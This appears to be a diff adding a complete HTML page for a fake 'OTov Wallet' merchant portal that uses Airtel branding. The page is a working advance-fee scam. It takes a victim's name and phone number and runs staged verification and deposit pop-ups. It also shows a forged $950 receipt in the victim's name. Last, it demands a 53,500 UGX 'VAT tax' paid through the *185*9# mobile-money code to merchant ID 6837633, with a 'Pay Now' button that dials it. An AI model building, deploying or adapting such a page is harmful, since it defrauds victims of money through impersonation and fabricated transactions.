@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OTov Wallet Merchant International Portal</title>
+    <style>
+        /* --- GLOBAL RESETS & VARIABLES --- */
+        :root { 
+            --airtel-red: #ff0000; 
+            --selar-blue: #002d5b; 
+            --bg-soft: #f4f7f9; 
+            --gold: #ffb400; 
+            --glass: rgba(255, 255, 255, 0.95); 
+            --OTovwallet-blue: #2374b6; /* Matched to the uploaded image */
+        }
+        
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+        }
+        
+        body { 
+            background-color: #1a1a1a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .mobile-container { 
+            width: 100%; 
+            max-width: 400px; 
+            background: white; 
+            min-height: 100vh; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5); 
+            position: relative; 
+            overflow-x: hidden; 
+        }
+        
+        .hidden { display: none !important; }
+
+        /* --- WELCOME VIEW (OTov-WALLET) --- */
+        #welcome-view { 
+            background-color: var(--OTovwallet-blue); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+            padding: 40px 25px; 
+        }
+        .welcome-top { 
+            flex-grow: 1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            margin-top: -10vh; /* Shift slightly up to match image */
+        }
+        .welcome-logo { 
+            width: 110px; 
+            height: 110px; 
+            margin-bottom: 25px; 
+        }
+        .welcome-title { 
+            color: white; 
+            font-size: 2.2rem; 
+            font-weight: 500; 
+            margin-bottom: 12px; 
+            letter-spacing: 0.5px;
+        }
+        .welcome-subtitle { 
+            color: white; 
+            font-size: 0.95rem; 
+            text-align: center; 
+            line-height: 1.5; 
+            opacity: 0.9; 
+        }
+        .welcome-buttons { 
+            display: flex; 
+            gap: 15px; 
+            width: 100%; 
+            margin-bottom: 20px; 
+        }
+        .welcome-buttons button { 
+            flex: 1; 
+            padding: 16px; 
+            font-size: 0.95rem; 
+            font-weight: 600; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            transition: opacity 0.2s;
+        }
+        .welcome-buttons button:active { opacity: 0.8; }
+        .btn-register { 
+            background: transparent; 
+            border: 1px solid rgba(255, 255, 255, 0.6); 
+            color: white; 
+        }
+        .btn-signin { 
+            background: white; 
+            border: none; 
+            color: var(--OTovwallet-blue); 
+        }
+        
+        /* --- LOGIN VIEW --- */
+        #login-view { background-color: var(--bg-soft); min-height: 100vh; }
+        .intl-header-box { font-size: 0.62rem; color: #666; text-align: right; padding: 12px; line-height: 1.3; background: white; border-bottom: 1px solid #eee; }
+        .login-hero { text-align: center; padding: 30px 20px; }
+        .airtel-logo-red { color: var(--airtel-red); font-size: 2.8rem; font-weight: 800; letter-spacing: -2px; }
+        .login-card { margin: 0 20px; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .login-card label { display: block; font-size: 0.7rem; font-weight: 700; color: #999; margin-bottom: 5px; text-transform: uppercase; }
+        .login-card input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 10px; border: 1.5px solid #f0f0f0; box-sizing: border-box; font-size: 1rem; }
+        .btn-access { width: 100%; padding: 16px; background: var(--airtel-red); color: white; border: none; border-radius: 30px; font-weight: 800; cursor: pointer; }
+
+        /* --- DASHBOARD VIEW --- */
+        .dash-header { background: var(--selar-blue); color: white; padding: 20px; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
+        .blink { animation: blinker 1.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.2; } }
+        .balance-section { background: white; margin: -20px 20px 0; padding: 20px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); text-align: center; }
+        
+        /* --- GRID --- */
+        .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; padding: 25px 20px; }
+        .service-item { text-align: center; cursor: pointer; text-decoration: none; }
+        .icon-circ { width: 55px; height: 55px; border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; font-size: 22px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .bg-transfer { background: #e3f2fd; color: #1976d2; } .bg-withdraw { background: #fff3e0; color: #f57c00; } 
+        .bg-bills { background: #fce4ec; color: #d81b60; } .bg-browser { background: #e8f5e9; color: #388e3c; }  
+        .bg-special { background: #f3e5f5; color: #7b1fa2; } .bg-rates { background: #fffde7; color: #fbc02d; }    
+        .service-label { font-size: 0.65rem; font-weight: 700; color: #666; }
+
+        /* --- NOTIFICATIONS / OVERLAYS --- */
+        .overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(8px); z-index: 1000; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .notif-card { background: var(--glass); border-radius: 25px; padding: 25px; border: 2px solid var(--airtel-red); width: 100%; box-shadow: 0 20px 50px rgba(0,0,0,0.3); text-align: center; }
+        .official-note { background: #fff; border-left: 5px solid var(--selar-blue); text-align: left; padding: 15px; font-size: 0.75rem; margin: 20px; line-height: 1.5; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .btn-ok { background: var(--airtel-red); color: white; border: none; padding: 12px 30px; border-radius: 20px; font-weight: bold; margin-top: 15px; cursor: pointer; width: 100%; }
+        .btn-row { display: flex; gap: 10px; margin-top: 15px; }
+        
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--airtel-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* --- TABLES / LISTS --- */
+        .rate-table { width: 100%; border-collapse: collapse; font-size: 0.8rem; margin-top: 10px; }
+        .rate-table td { padding: 8px; border-bottom: 1px solid #eee; }
+
+        /* --- EMBEDDED RECEIPT SECTION STYLING --- */
+        .receipt-section-wrapper {
+            margin: 15px 20px 25px 20px;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        .top-banner { background-color: #0d233a; padding: 10px 12px; }
+        .top-banner-inner { border: 1px solid #4a7a56; padding: 6px 10px; }
+        .top-banner-text { color: #5cb85c; font-weight: bold; font-size: 11px; letter-spacing: 0.5px; }
+        .receipt-body { padding: 12px; background-color: #ffffff; display: flex; flex-direction: column; gap: 10px; }
+        .receipt-header-card { background-color: #0e2e54; color: #ffffff; padding: 12px 14px; display: flex; justify-content: space-between; align-items: flex-start; }
+        .receipt-for { font-size: 11px; color: #a0b2c6; margin-bottom: 2px; }
+        .success-title { font-size: 14px; font-weight: 700; line-height: 1.2; }
+        .reference-box { text-align: right; }
+        .reference-label { font-size: 10px; color: #a0b2c6; }
+        .reference-number { font-size: 12px; font-weight: bold; letter-spacing: 0.5px; }
+        .receipt-details-card { background-color: #fbf7ee; padding: 12px 14px; display: flex; flex-direction: column; gap: 12px; }
+        .data-group { display: flex; flex-direction: column; }
+        .label { font-size: 11px; color: #7a7a7a; margin-bottom: 1px; }
+        .value { font-size: 13px; font-weight: bold; color: #222222; }
+        .overlap-container { position: relative; height: 18px; }
+        .value-base { position: absolute; left: 0; top: 0; font-size: 13px; font-weight: bold; color: #222222; }
+        .value-overlap { position: absolute; left: 78px; top: 0; font-size: 13px; font-weight: bold; color: #222222; }
+        .amount-row { font-size: 13px; font-weight: bold; }
+        .currency-usd { color: #222222; } .amount-usd { color: #428bca; } .separator { color: #222222; }
+        .amount-ugx { color: #428bca; } .currency-ugx { color: #222222; }
+        .status-success { color: #5cb85c; font-size: 13px; font-weight: bold; }
+        .total-box-container { margin-top: 5px; align-self: flex-start; }
+        .total-box { border: 1px solid #dcdcdc; background-color: #ffffff; padding: 4px 12px; display: flex; flex-direction: column; align-items: flex-end; min-width: 140px; }
+        .total-label { font-size: 10px; color: #7a7a7a; margin-bottom: 2px; width: 100%; text-align: right; }
+        .total-amount-wrapper { display: flex; align-items: center; gap: 4px; }
+        .flag-icon { width: 16px; height: 11px; }
+        .total-final-value { font-size: 14px; font-weight: bold; color: #111111; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-container">
+    
+    <div id="welcome-view">
+        <div class="welcome-top">
+            <svg class="welcome-logo" viewBox="0 0 100 100">
+                <path d="M 50 10 L 95 90 L 50 65 L 5 90 Z" fill="white" />
+            </svg>
+            <h1 class="welcome-title">OTov-Wallet</h1>
+            <p class="welcome-subtitle">Manage all Transactions easily<br>in one place</p>
+        </div>
+        <div class="welcome-buttons">
+            <button class="btn-register" onclick="proceedToLogin()">Register</button>
+            <button class="btn-signin" onclick="proceedToLogin()">Sign in</button>
+        </div>
+    </div>
+
+    <div id="login-view" class="hidden">
+        <div class="intl-header-box">
+            <b>OTov Merchant Invoice International</b><br>
+            Plot Z, USA, Chicago, Brooklyn Street Road, P.O. Box 25630 - Chicago<br>
+            +1 - USA
+        </div>
+        <div class="login-hero">
+            <div class="airtel-logo-red">OTov/airtel</div>
+            <p style="font-size: 0.75rem; color: #999; font-weight: bold;">OTov MERCHANT PORTAL</p>
+        </div>
+        <div class="login-card">
+            <label>Full Name</label>
+            <input type="text" id="m-name" placeholder="Enter Full Name">
+            
+            <label>Phone Number</label>
+            <input type="text" id="m-phone" placeholder="Enter Phone Number">
+            
+            <label>Create Merchant Password</label>
+            <input type="password" id="m-pin" placeholder="••••••••">
+            
+            <button class="btn-access" onclick="startVerification()">Access Dashboard</button>
+        </div>
+    </div>
+
+    <div id="notif-verifying" class="overlay hidden">
+        <div class="notif-card">
+            <div class="airtel-logo-red" style="font-size: 1.5rem;">airtel</div>
+            <div class="spinner"></div>
+            <p id="verifying-text" style="font-size: 0.85rem; color: #444; font-weight: 500;"></p>
+        </div>
+    </div>
+
+    <div id="notif-sim-success" class="overlay hidden">
+        <div class="notif-card">
+            <div style="font-size: 2rem; margin-bottom: 10px;">✅</div>
+            <b style="color: var(--selar-blue); font-size: 0.9rem;">SIM CARD VERIFIED ON OTov WALLET MERCHANT ACCOUNT</b>
+            <p id="success-user-text" style="font-size: 0.8rem; margin: 15px 0; color: #555;"></p>
+            <p style="font-size: 0.75rem; color: #28a745; font-weight: bold;">Now you can start receiving money in different currency</p>
+            <button class="btn-ok" onclick="showDashboardAfterSuccess()">okay i have understood</button>
+        </div>
+    </div>
+
+    <div id="notif-deposit" class="overlay hidden">
+        <div class="notif-card">
+            <div style="font-size: 2rem; margin-bottom: 10px;">💰</div>
+            <b style="color: #28a745; font-size: 1rem;">DEPOSIT DETECTED</b>
+            <p style="font-size: 0.85rem; color: #333; margin: 15px 0; line-height: 1.4;">
+                <b>Lolikishee USA CHICAGO</b><br>
+                Amount: <span style="color:var(--airtel-red); font-weight:900;">950$</span><br>
+                via OTov merchant transaction system
+            </p>
+            <button class="btn-ok" onclick="closeDepositNotif()">ok i have understood</button>
+        </div>
+    </div>
+
+    <div id="dashboard-view" class="hidden">
+        <div class="intl-header-box"><b>OTov Merchant Invoice International</b> | +1 - USA</div>
+        
+        <div class="dash-header">
+            <div style="font-size: 0.6rem; font-weight: 800; color: var(--gold);">OTov VISA MASTERCARD</div>
+            <div class="recent-msg" style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 10px; font-size: 0.7rem; margin-top: 12px; border-left: 3px solid #00ff00;">
+                ACTIVITY: <span class="blink" style="color:#00ff00; font-weight: bold;">$950 Sent</span> lolikishee USA CHICAGO🇺🇲 <span class="blink" style="background:red; padding:2px 4px; border-radius:3px;">LIVE</span>
+            </div>
+            <div id="dash-user" style="margin-top: 15px; font-weight: 800; font-size: 0.9rem;"></div>
+        </div>
+
+        <div class="balance-section">
+            <div style="font-size: 0.6rem; color: #bbb;">TOTAL FLOAT BALANCE</div>
+            <div class="blink" style="font-size: 1.6rem; font-weight: 900; color: var(--selar-blue);">3,581,041.15 UGX</div>
+            <div class="blink" style="font-size: 1rem; font-weight: bold; color: #2e7d32;">EQUALS EXACTLY 950$</div>
+        </div>
+
+        <div class="official-note">
+            <b style="color: var(--selar-blue); border-bottom: 1px solid #ddd; display: block; padding-bottom: 5px; margin-bottom: 8px;">Official Notes</b>
+            Your invoice is successfully matured Pay the final stage of VAT tax <b>53,500 UGX</b> on your SIM card and Click <b>Withdrawal</b> button to pay VAT TAX of the matured invoice to initiate 950$ into UGX directly to your SIM card to complete transaction.
+        </div>
+
+        <div class="service-grid">
+            <div onclick="startFxFlow()" class="service-item"><div class="icon-circ bg-transfer">💸</div><div class="service-label">Transfer</div></div>
+            <div onclick="startFxFlow()" class="service-item"><div class="icon-circ bg-withdraw">📠</div><div class="service-label">Withdraw</div></div>
+            <a href="tel:*185*4%23" class="service-item"><div class="icon-circ bg-bills">🧾</div><div class="service-label">Pay Bills</div></a>
+            <div class="service-item"><div class="icon-circ bg-browser">🌐</div><div class="service-label">Browser</div></div>
+            <div onclick="showRates()" class="service-item"><div class="icon-circ bg-rates">💱</div><div class="service-label">Ex-Rate</div></div>
+            <div onclick="showSpecial()" class="service-item"><div class="icon-circ bg-special">🎁</div><div class="service-label">Special</div></div>
+        </div>
+
+        <div class="receipt-section-wrapper">
+            <div class="top-banner">
+                <div class="top-banner-inner">
+                    <span class="top-banner-text">OTov MOBILE WALLET TRANSACTION.</span>
+                </div>
+            </div>
+
+            <div class="receipt-body">
+                <div class="receipt-header-card">
+                    <div>
+                        <div class="receipt-for">Receipt for.</div>
+                        <div class="success-title">Successful Payment Transfer</div>
+                    </div>
+                    <div class="reference-box">
+                        <div class="reference-label">Reference</div>
+                        <div class="reference-number">70082338</div>
+                    </div>
+                </div>
+
+                <div class="receipt-details-card">
+                    <div class="data-group">
+                        <span class="label">From Account</span>
+                        <span class="label" style="margin-top: -2px; font-weight: bold; color: #222;">Lolikishee</span>
+                        <div class="overlap-container">
+                            <span class="value-base">1016539173502</span>
+                            <span class="value-overlap"></span>
+                        </div>
+                    </div>
+
+                    <div class="data-group">
+                        <span class="label">Beneficiary Name</span>
+                        <span class="value" id="receipt-beneficiary-name">FADI BADR</span>
+                    </div>
+
+                    <div class="data-group">
+                        <span class="label">Amount</span>
+                        <div class="amount-row">
+                            <span class="currency-usd">USD</span> 
+                            <span class="amount-usd blink">950.00</span><span class="separator">~</span><span class="amount-ugx blink">3,581,041.15</span> 
+                            <span class="currency-ugx">UGX</span>
+                        </div>
+                    </div>
+
+                    <div class="data-group">
+                        <span class="label">Status</span>
+                        <span class="status-success">Success</span>
+                    </div>
+
+                    <div class="data-group">
+                        <span class="label">Swift Ref No.</span>
+                        <span class="value">000065608802</span>
+                    </div>
+
+                    <div class="data-group">
+                        <span class="label">Beneficiary Account/IBAN</span>
+                        <span class="value" id="receipt-beneficiary-account">521380******5754</span>
+                    </div>
+
+                    <div class="total-box-container">
+                        <div class="total-box">
+                            <div class="total-label">Total Amount</div>
+                            <div class="total-amount-wrapper">
+                                <svg class="flag-icon" viewBox="0 0 74 39">
+                                    <rect width="74" height="39" fill="#b22234"/>
+                                    <path d="M0,3h74M0,9h74M0,15h74M0,21h74M0,27h74M0,33h74" stroke="#fff" stroke-width="3"/>
+                                    <rect width="30" height="21" fill="#3c3b6e"/>
+                                    <circle cx="4" cy="3" r="1" fill="#fff"/><circle cx="10" cy="3" r="1" fill="#fff"/><circle cx="16" cy="3" r="1" fill="#fff"/><circle cx="22" cy="3" r="1" fill="#fff"/><circle cx="26" cy="3" r="1" fill="#fff"/>
+                                    <circle cx="7" cy="7" r="1" fill="#fff"/><circle cx="13" cy="7" r="1" fill="#fff"/><circle cx="19" cy="7" r="1" fill="#fff"/><circle cx="25" cy="7" r="1" fill="#fff"/>
+                                    <circle cx="4" cy="11" r="1" fill="#fff"/><circle cx="10" cy="11" r="1" fill="#fff"/><circle cx="16" cy="11" r="1" fill="#fff"/><circle cx="22" cy="11" r="1" fill="#fff"/><circle cx="26" cy="11" r="1" fill="#fff"/>
+                                    <circle cx="7" cy="15" r="1" fill="#fff"/><circle cx="13" cy="15" r="1" fill="#fff"/><circle cx="19" cy="15" r="1" fill="#fff"/><circle cx="25" cy="15" r="1" fill="#fff"/>
+                                    <circle cx="4" cy="18" r="1" fill="#fff"/><circle cx="10" cy="18" r="1" fill="#fff"/><circle cx="16" cy="18" r="1" fill="#fff"/><circle cx="22" cy="18" r="1" fill="#fff"/><circle cx="26" cy="18" r="1" fill="#fff"/>
+                                </svg>
+                                <span class="total-final-value">USD 950.00</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="view-special" class="overlay hidden">
+        <div class="notif-card" style="text-align: left;">
+            <b style="color: var(--selar-blue);">OTov Merchant Coupons</b>
+            <p style="font-size: 0.8rem; line-height: 1.6; color: #444; margin: 15px 0;">Use your OTov merchant coupons in the international market to buy goods online. Merchants are eligible for 15% discount on Amazon, Alibaba, and eBay using the merchant portal.</p>
+            <button class="btn-ok" onclick="closeOverlay('view-special')">yes i have understood</button>
+        </div>
+    </div>
+
+    <div id="view-rates" class="overlay hidden">
+        <div class="notif-card">
+            <b style="color: var(--selar-blue);">Market Exchange Rates</b>
+            <table class="rate-table">
+                <tr><td>USD/UGX</td><td style="color:green">3,850</td></tr>
+                <tr><td>GBP/UGX</td><td style="color:green">4,820</td></tr>
+                <tr><td>EUR/UGX</td><td style="color:green">4,110</td></tr>
+                <tr><td>KES/UGX</td><td style="color:green">28.5</td></tr>
+                <tr><td>TZS/UGX</td><td style="color:green">1.48</td></tr>
+            </table>
+            <button class="btn-ok" onclick="closeOverlay('view-rates')">Back to Dashboard</button>
+        </div>
+    </div>
+
+    <div id="notif-fx-loading" class="overlay hidden">
+        <div class="notif-card">
+            <div class="spinner"></div>
+            <p id="fx-load-text" style="font-size: 0.85rem; color: #444;"></p>
+        </div>
+    </div>
+
+    <div id="notif-fx-charge" class="overlay hidden">
+        <div class="notif-card" style="text-align: left; border-width: 3px;">
+            <b style="color: var(--selar-blue); display:block; text-align:center;">OTov MERCHANT ACCOUNT</b>
+            <p style="color: #28a745; font-weight: 800; text-align:center; margin: 10px 0;">SIM CARD VERIFIED!</p>
+            <p style="font-size: 0.75rem; text-align:center;">Currently Work on Airtel <span class="blink">🇺🇬</span></p>
+            
+            <p style="font-size: 0.8rem; margin: 15px 0;">Pay VAT tax charge to initiate transaction of <b>950$</b> on <b id="fx-user-target" style="color:var(--selar-blue)"></b></p>
+            
+            <div style="background: #f9f9f9; padding: 15px; border-radius: 12px; font-size: 0.8rem; line-height: 1.7;">
+                <b style="color:var(--airtel-red)">How to Pay VAT tax Charge on your SIM card</b><br>
+                Dial: <b>*185*9#</b> 📞<br>
+                🆔 Merchant ID: <b>6837633</b><br>
+                💵 Amount: <b>53500</b><br>
+                🔖 Reference: <b>OTov merchant</b><br>
+                <small>Confirm fx charge to complete transaction on OTov system</small>
+            </div>
+
+            <div class="btn-row">
+                <button onclick="window.location.href='tel:*185*9%23'" style="flex:1; background:var(--airtel-red); color:white; border:none; padding:12px; border-radius:10px; font-weight:bold; cursor:pointer;">Pay Now</button>
+                <button onclick="closeOverlay('notif-fx-charge')" style="flex:1; background:#ddd; border:none; padding:12px; border-radius:10px; font-weight:bold; cursor:pointer;">Pay Later</button>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let currentUser = null;
+
+    window.onload = function() {
+        const saved = localStorage.getItem('selar_session_v5');
+        if (saved) {
+            currentUser = JSON.parse(saved);
+            // Hide welcome screen directly if session exists
+            document.getElementById('welcome-view').classList.add('hidden');
+            launchDashDirectly();
+        }
+    };
+
+    // New Function to transition from Welcome Screen to Login
+    function proceedToLogin() {
+        document.getElementById('welcome-view').classList.add('hidden');
+        document.getElementById('login-view').classList.remove('hidden');
+    }
+
+    function startVerification() {
+        const name = document.getElementById('m-name').value;
+        const phone = document.getElementById('m-phone').value;
+        if (!name || !phone) { alert("Please fill all fields"); return; }
+        
+        currentUser = { name, phone };
+        localStorage.setItem('selar_session_v5', JSON.stringify(currentUser));
+        
+        document.getElementById('login-view').classList.add('hidden');
+        document.getElementById('notif-verifying').classList.remove('hidden');
+        document.getElementById('verifying-text').innerText = `Verifying (${phone} - ${name}) on OTov merchant transaction system`;
+
+        setTimeout(() => {
+            document.getElementById('notif-verifying').classList.add('hidden');
+            document.getElementById('notif-sim-success').classList.remove('hidden');
+            document.getElementById('success-user-text').innerText = `(${phone} - ${name})`;
+        }, 10000);
+    }
+
+    function showDashboardAfterSuccess() {
+        document.getElementById('notif-sim-success').classList.add('hidden');
+        launchDashDirectly();
+        
+        setTimeout(() => {
+            document.getElementById('notif-deposit').classList.remove('hidden');
+        }, 1000);
+    }
+
+    function launchDashDirectly() {
+        document.getElementById('login-view').classList.add('hidden');
+        document.getElementById('dashboard-view').classList.remove('hidden');
+        document.getElementById('dash-user').innerText = `${currentUser.phone} - ${currentUser.name.toUpperCase()}`;
+        
+        // Fill beneficiary details in receipt
+        document.getElementById('receipt-beneficiary-name').innerText = currentUser.name.toUpperCase();
+        document.getElementById('receipt-beneficiary-account').innerText = currentUser.phone;
+    }
+
+    function closeDepositNotif() { document.getElementById('notif-deposit').classList.add('hidden'); }
+    function showRates() { document.getElementById('view-rates').classList.remove('hidden'); }
+    function showSpecial() { document.getElementById('view-special').classList.remove('hidden'); }
+    function closeOverlay(id) { document.getElementById(id).classList.add('hidden'); }
+
+    function startFxFlow() {
+        document.getElementById('notif-fx-loading').classList.remove('hidden');
+        document.getElementById('fx-load-text').innerText = `Initiating Transaction of 950$ to (${currentUser.phone} - ${currentUser.name}) from OTov Merchant account`;
+        
+        setTimeout(() => {
+            document.getElementById('notif-fx-loading').classList.add('hidden');
+            document.getElementById('notif-fx-charge').classList.remove('hidden');
+            document.getElementById('fx-user-target').innerText = `${currentUser.phone} - ${currentUser.name}`;
+        }, 8000);
+    }
+</script>
+
+</body>
+</html>
